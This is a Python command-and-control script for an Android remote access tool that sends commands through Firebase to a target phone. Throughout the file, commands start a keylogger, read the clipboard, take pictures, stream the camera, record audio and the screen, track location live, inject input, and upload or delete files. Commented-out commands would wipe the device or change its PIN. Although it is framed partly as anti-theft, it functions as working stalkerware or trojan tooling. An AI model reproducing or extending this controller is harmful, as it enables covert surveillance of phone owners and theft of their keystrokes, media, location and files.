#!/usr/bin/env python3
"""
Example Command Sender for Advanced Phone Control System

This script demonstrates how to send commands to the Android device
using all the available features of the system.

Usage:
    python example_commands.py

Requirements:
    - firebase-admin
    - Firebase project with Realtime Database
    - Service account key in firebase-credentials.json

IMPORTANT: Set your actual Firebase Realtime Database URL in the code below!
"""

import firebase_admin
from firebase_admin import credentials, db
import json
import time
import sys

# Initialize Firebase
try:
    cred = credentials.Certificate('firebase-credentials.json')
    firebase_admin.initialize_app(cred, {
        'databaseURL': 'https://your-project-id.firebaseio.com'  # <-- CHANGE THIS TO YOUR DATABASE URL
    })
    ref = db.reference()
except Exception as e:
    print(f"Firebase initialization failed: {e}")
    print("Please ensure firebase-credentials.json exists and is valid")
    sys.exit(1)

# User ID for the target device
USER_ID = "default_user"

def send_command(action, params=None):
    """Send a command to the device"""
    command = {
        "action": action,
        "timestamp": int(time.time() * 1000)
    }
    
    if params:
        command["params"] = params
    
    # Send command to Firebase
    command_ref = ref.child('commands').child(USER_ID).push()
    command_ref.set(json.dumps(command))
    
    print(f"✅ Sent command: {action}")
    if params:
        print(f"   Parameters: {json.dumps(params, indent=2)}")
    
    return command_ref.key

def wait_for_response(command_key, timeout=30):
    """Wait for response from device"""
    print(f"⏳ Waiting for response... (timeout: {timeout}s)")
    
    start_time = time.time()
    while time.time() - start_time < timeout:
        response_ref = ref.child('command_responses').child(USER_ID).child(command_key)
        response = response_ref.get()
        
        if response:
            print(f"📱 Response: {response}")
            response_ref.delete()  # Clean up
            return response
        
        time.sleep(1)
    
    print("⏰ Timeout waiting for response")
    return None

def demo_camera_features():
    """Demonstrate camera and media features"""
    print("\n📸 Camera & Media Features Demo")
    print("=" * 40)
    
    # Take a picture
    send_command("TAKE_PICTURE", {"camera": "back"})
    time.sleep(2)
    
    # Start camera streaming
    send_command("STREAM_CAMERA", {"quality": "720p", "fps": 15})
    time.sleep(5)
    
    # Stop camera streaming
    send_command("STOP_CAMERA")
    time.sleep(2)
    
    # Record audio
    send_command("RECORD_AUDIO", {"duration": 10000, "upload": True})
    time.sleep(12)
    
    # Stop audio recording
    send_command("STOP_MIC")
    time.sleep(2)

def demo_location_features():
    """Demonstrate location and device info features"""
    print("\n🛰️ Location & Device Info Demo")
    print("=" * 40)
    
    # Get current location
    send_command("GET_LOCATION", {"accuracy": "high"})
    time.sleep(3)
    
    # Start live tracking
    send_command("LIVE_TRACKING", {"interval": 30, "enabled": True})
    time.sleep(5)
    
    # Get device information
    send_command("GET_DEVICE_INFO")
    time.sleep(3)

def demo_control_features():
    """Demonstrate device control and automation features"""
    print("\n📱 Control & Automation Demo")
    print("=" * 40)
    
    # Launch an app
    send_command("LAUNCH_APP", {"package": "com.android.settings"})
    time.sleep(3)
    
    # Open a URL
    send_command("OPEN_URL", {"url": "https://www.google.com"})
    time.sleep(3)
    
    # Toggle WiFi
    send_command("TOGGLE_WIFI", {"enable": False})
    time.sleep(3)
    send_command("TOGGLE_WIFI", {"enable": True})
    time.sleep(3)
    
    # Toggle Bluetooth
    send_command("TOGGLE_BLUETOOTH", {"enable": False})
    time.sleep(3)
    send_command("TOGGLE_BLUETOOTH", {"enable": True})
    time.sleep(3)
    
    # Vibrate device
    send_command("VIBRATE", {"duration": 2000})
    time.sleep(3)
    
    # Show a toast message
    send_command("SHOW_TOAST", {"message": "Hello from remote control!"})
    time.sleep(3)

def demo_file_features():
    """Demonstrate file and storage features"""
    print("\n💾 File & Storage Demo")
    print("=" * 40)
    
    # List files in Downloads directory
    send_command("LIST_FILES", {"path": "/storage/emulated/0/Download"})
    time.sleep(3)
    
    # Write a test file
    send_command("WRITE_FILE", {
        "path": "/storage/emulated/0/Download/test.txt",
        "content": "This is a test file created by remote control!"
    })
    time.sleep(3)
    
    # Read the test file
    send_command("READ_FILE", {"path": "/storage/emulated/0/Download/test.txt"})
    time.sleep(3)
    
    # Download a file from URL
    send_command("DOWNLOAD_FILE", {
        "url": "https://httpbin.org/json",
        "local_path": "/storage/emulated/0/Download/sample.json"
    })
    time.sleep(5)
    
    # Upload file to Firebase
    send_command("UPLOAD_FILE", {"path": "/storage/emulated/0/Download/test.txt"})
    time.sleep(5)
    
    # Delete the test file
    send_command("DELETE_FILE", {"path": "/storage/emulated/0/Download/test.txt"})
    time.sleep(3)

def demo_remote_access_features():
    """Demonstrate remote access and system control features"""
    print("\n🔑 Remote Access & System Control Demo")
    print("=" * 40)
    
    # Start keylogger
    send_command("KEYLOGGER", {"action": "start"})
    time.sleep(5)
    
    # Read clipboard
    send_command("CLIPBOARD_READ")
    time.sleep(3)
    
    # Write to clipboard
    send_command("CLIPBOARD_WRITE", {"text": "Remote clipboard test"})
    time.sleep(3)
    
    # Inject tap input
    send_command("INJECT_INPUT", {
        "type": "tap",
        "x": 500,
        "y": 300
    })
    time.sleep(3)
    
    # Inject swipe input
    send_command("INJECT_INPUT", {
        "type": "swipe",
        "startX": 100,
        "startY": 200,
        "endX": 300,
        "endY": 400,
        "duration": 500
    })
    time.sleep(3)
    
    # Inject text input
    send_command("INJECT_INPUT", {
        "type": "text",
        "text": "Hello from remote input!"
    })
    time.sleep(3)
    
    # Set brightness
    send_command("SET_BRIGHTNESS", {"brightness": 150})
    time.sleep(3)
    
    # Set volume
    send_command("SET_VOLUME", {"volume": 50})
    time.sleep(3)
    
    # Stop keylogger
    send_command("KEYLOGGER", {"action": "stop"})
    time.sleep(3)

def demo_security_features():
    """Demonstrate security and anti-theft features"""
    print("\n🔐 Security & Anti-Theft Demo")
    print("=" * 40)
    
    # Lock device
    send_command("LOCK_DEVICE")
    time.sleep(3)
    
    # Change PIN (use with caution!)
    # send_command("CHANGE_PIN", {"pin": "1234"})
    # time.sleep(3)
    
    # Wipe data (use with extreme caution!)
    # send_command("WIPE_DATA")
    # time.sleep(3)
    
    print("⚠️  Security features require device admin permissions")
    print("⚠️  Wipe data and change PIN commands are commented out for safety")

def demo_screen_features():
    """Demonstrate screen capture and recording features"""
    print("\n🖥️ Screen Features Demo")
    print("=" * 40)
    
    # Start screen recording
    send_command("SCREEN_RECORD", {"action": "start"})
    time.sleep(10)
    
    # Stop screen recording
    send_command("SCREEN_RECORD", {"action": "stop"})
    time.sleep(3)
    
    print("📱 Note: Screen capture requires MediaProjection permission")
    print("📱 This should be requested through the app interface")

def interactive_mode():
    """Interactive command mode"""
    print("\n🎮 Interactive Command Mode")
    print("=" * 40)
    print("Enter commands in format: action [params]")
    print("Example: GET_LOCATION")
    print("Example: SHOW_TOAST {\"message\": \"Hello\"}")
    print("Type 'quit' to exit")
    
    while True:
        try:
            command = input("\n> ").strip()
            
            if command.lower() == 'quit':
                break
            
            if ' ' in command:
                action, params_str = command.split(' ', 1)
                try:
                    params = json.loads(params_str)
                except json.JSONDecodeError:
                    print("❌ Invalid JSON parameters")
                    continue
            else:
                action = command
                params = None
            
            # Send command
            command_key = send_command(action, params)
            
            # Wait for response
            wait_for_response(command_key, 10)
            
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"❌ Error: {e}")

def main():
    """Main function"""
    print("🚀 Advanced Phone Control System - Command Examples")
    print("=" * 60)
    
    while True:
        print("\nSelect a demo:")
        print("1. Camera & Media Features")
        print("2. Location & Device Info")
        print("3. Control & Automation")
        print("4. File & Storage")
        print("5. Remote Access & System Control")
        print("6. Security & Anti-Theft")
        print("7. Screen Features")
        print("8. Interactive Mode")
        print("9. Run All Demos")
        print("0. Exit")
        
        choice = input("\nEnter your choice (0-9): ").strip()
        
        if choice == '0':
            print("👋 Goodbye!")
            break
        elif choice == '1':
            demo_camera_features()
        elif choice == '2':
            demo_location_features()
        elif choice == '3':
            demo_control_features()
        elif choice == '4':
            demo_file_features()
        elif choice == '5':
            demo_remote_access_features()
        elif choice == '6':
            demo_security_features()
        elif choice == '7':
            demo_screen_features()
        elif choice == '8':
            interactive_mode()
        elif choice == '9':
            print("\n🎬 Running all demos...")
            demo_camera_features()
            demo_location_features()
            demo_control_features()
            demo_file_features()
            demo_remote_access_features()
            demo_security_features()
            demo_screen_features()
            print("\n✅ All demos completed!")
        else:
            print("❌ Invalid choice. Please try again.")

if __name__ == "__main__":
    main()